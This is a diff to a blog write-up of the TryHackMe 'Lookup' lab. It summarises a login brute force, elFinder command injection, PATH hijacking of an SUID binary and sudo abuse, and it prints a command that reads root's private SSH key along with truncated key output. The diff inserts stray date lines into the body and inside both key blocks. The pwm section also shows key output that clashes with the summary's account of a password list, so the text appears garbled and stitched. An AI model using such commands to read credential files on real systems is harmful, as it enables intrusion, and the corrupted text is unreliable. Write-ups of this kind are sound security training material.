@@ -1,4 +1,5 @@
 ﻿---
+date: 2024-08-05 00:00:00 +0100
 title: 'TryHackMe - Lookup'
 author : Matty
 categories: [TryHackMe]
@@ -9,6 +10,7 @@ image:
   path: room_image.webp
 ---
 
+date: 2024-08-05 00:00:00 +0100
 **Lookup** started with brute-forcing a login form to discover a set of credentials. Using these credentials to log in, we found a virtual host (**vhost**) with an **elFinder** installation. By exploiting a **command injection** vulnerability in **elFinder**, we managed to get a shell on the machine. Then, by abusing **PATH hijacking** to manipulate the behavior of an **SUID binary**, we obtained a list of passwords. Testing them against the **SSH** service, we discovered another set of credentials and used **SSH** to gain a shell as a different user. As this user, we leveraged our **sudo** privileges to read the private **SSH** key of the **root** user and used it to gain a shell as **root**.
 
 [![Tryhackme Room Link](/images/tryhackme_lookup/room_card.webp)](https://tryhackme.com/r/room/lookup){: .center }
@@ -460,10 +462,12 @@ Using this method, we are successful at reading the private **SSH** key for the 
 ```console
 think@lookup:~$ sudo /usr/bin/look '' /root/.ssh/id_rsa
 -----BEGIN OPENSSH PRIVATE KEY-----
+date: 2024-08-05 00:00:00 +0100
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
 ...
 DgTNYOtefYf4OEpwAAABFyb290QHVidW50dXNlcnZlcg==
 -----END OPENSSH PRIVATE KEY-----
+date: 2024-08-05 00:00:00 +0100
 ```
 
 We can save this private key in a file, set the correct permissions for it, and then use it with **SSH** to gain a shell as the `root` user. From there, we can read the root flag at `/root/root.txt` and complete the room.
@@ -520,10 +524,12 @@ www-data@lookup:/var/www/html$ /usr/sbin/pwm
 [!] Running 'id' command to extract the username and user ID (UID)
 [!] ID: ../var/www/html
 -----BEGIN OPENSSH PRIVATE KEY-----
+date: 2024-08-05 00:00:00 +0100
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
 ...
 DgTNYOtefYf4OEpwAAABFyb290QHVidW50dXNlcnZlcg==
 -----END OPENSSH PRIVATE KEY-----
+date: 2024-08-05 00:00:00 +0100
 ```
 
 <style>
